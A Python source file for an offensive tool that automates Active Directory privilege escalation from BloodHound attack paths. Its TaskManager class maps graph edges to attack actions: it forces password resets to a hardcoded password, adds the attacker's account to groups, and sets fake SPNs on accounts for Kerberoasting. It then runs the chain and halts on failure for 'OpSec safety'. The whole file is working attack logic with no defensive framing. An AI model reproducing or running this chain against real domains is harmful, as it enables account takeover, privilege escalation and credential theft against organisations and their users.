class TaskManager:
    def __init__(self, exploit_engine):
        self.engine = exploit_engine
        self.task_queue = []

    def build_plan(self, path_results):
        """Maps path relationships to specific engine actions."""
        path = path_results[0]['p']
        
        for rel in path.relationships:
            edge_type = rel.type
            target_dn = rel.end_node['distinguishedname'] # BloodHound property
            
            if edge_type == "ForceChangePassword":
                self.task_queue.append({
                    "action": self.engine.force_change_password,
                    "args": (target_dn, "ViperStrike2026!"),
                    "desc": f"Reset password for {target_dn}"
                })
            
            elif edge_type == "GenericWrite":
                # Logic: If target is a group, we add a member
                if "Group" in rel.end_node.labels:
                    self.task_queue.append({
                        "action": self.engine.add_group_member,
                        "args": (target_dn, "YOUR_USER_DN"),
                        "desc": f"Add member to group {target_dn}"
                    })
            
            elif edge_type == "GenericAll":
                self.task_queue.append({
                    "action": self.engine.set_fake_spn,
                    "args": (target_dn, "viper/roasted"),
                    "desc": f"Set SPN on {target_dn} for Kerberoasting"
                })

    def execute_all(self):
        """Runs the mapped tasks in order."""
        print(f"\n[*] Starting Execution of {len(self.task_queue)} tasks...")
        for task in self.task_queue:
            print(f"--- [Task]: {task['desc']} ---")
            success = task['action'](*task['args'])
            if not success:
                print("[!] Task failed. Stopping chain for OpSec safety.")
                break